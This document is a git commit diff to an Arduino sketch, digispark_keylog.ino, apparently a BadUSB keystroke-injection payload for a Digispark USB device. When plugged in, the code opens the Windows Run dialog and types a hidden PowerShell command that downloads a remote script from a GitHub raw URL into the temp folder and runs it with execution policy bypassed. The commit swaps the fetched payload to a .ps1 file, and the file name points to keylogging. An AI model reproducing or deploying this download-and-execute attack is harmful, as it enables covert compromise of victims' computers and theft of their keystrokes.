373c48bad49322519a120055ffcd4a15c6d46801
JorgeRamnA69 <156077543+JorgeRamnA69@users.noreply.github.com>
2024-02-07 17:08:21 +0100

    Update digispark_keylog.ino

--- digispark_keylog.ino
+++ digispark_keylog.ino
@@ -8,7 +8,7 @@ void loop() {
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
-  DigiKeyboardFi.print("powershell -w Hidden -c \"(New-Object System.Net.WebClient).DownloadFile(\'https://raw.githubusercontent.com/JorgeRamnA69/trabajo90jt32gvnhw3eo9/main/Script4.py\', \\\"$env:Temp\\Script4.py\\\"); powershell -ExecutionPolicy Bypass \\\"$env:Temp\\Script4.py\\\"\"");
+  DigiKeyboardFi.print("powershell -w Hidden -c \"(New-Object System.Net.WebClient).DownloadFile(\'https://raw.githubusercontent.com/JorgeRamnA69/trabajo90jt32gvnhw3eo9/main/helper_post.ps1\', \\\"$env:Temp\\Script4.ps1\\\"); powershell -ExecutionPolicy Bypass \\\"$env:Temp\\Script4.ps1\\\"\"");
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(3000);
